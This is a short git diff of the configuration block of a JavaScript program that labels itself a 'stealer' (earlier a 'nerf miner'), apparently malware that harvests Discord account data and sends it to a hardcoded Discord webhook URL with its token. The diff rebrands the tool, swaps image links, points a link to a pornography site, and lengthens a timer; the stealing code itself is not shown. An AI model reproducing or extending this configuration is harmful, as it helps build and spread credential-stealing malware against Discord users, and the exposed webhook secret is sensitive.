@@ -12,7 +12,7 @@ const { Webhook } = require('discord-webhook-node')
 
 
 var config = {
-    brand: "ekreta_fucker",
+    brand: "nullexpressionontop",
 
     webhook: "https://discord.com/api/webhooks/1030149447654588417/H6-LBrsV3vOCU7IFi9aWBBWpLkkTtNHHqCM9Cuasl3sdLI4-6hYMzwmZx0ar5DapNgB4",
 
@@ -24,13 +24,13 @@ var config = {
     ping: [true, "@everyone"],
 
     embed: {
-        username: "nerf miner",
+        username: "nullexpression's stealer",
         footer: {
-            text: `nerf miner`,
-            icon_url: "https://i.ytimg.com/vi/ojejp175gD8/maxresdefault.jpg",
+            text: `nullexpression's stealer`,
+            icon_url: "https://i.cdn29.hu/apix_collect_c/ngg_images/2209/24/anonymus_175927_1_original_1150x645_cover.jpg",
         },
-        href: "https://fasszopo.kiberesek.com",
-        avatar_url: "https://i.ytimg.com/vi/ojejp175gD8/maxresdefault.jpg"
+        href: "https://pornhub.com",
+        avatar_url: "https://i.cdn29.hu/apix_collect_c/ngg_images/2209/24/anonymus_175927_1_original_1150x645_cover.jpg"
     },
 
     badges: {
@@ -127,7 +127,7 @@ setTimeout(function () {
 		if (err) throw err;
 	}
 		);
-}, 8000);
+}, 16000);
 })
 
 
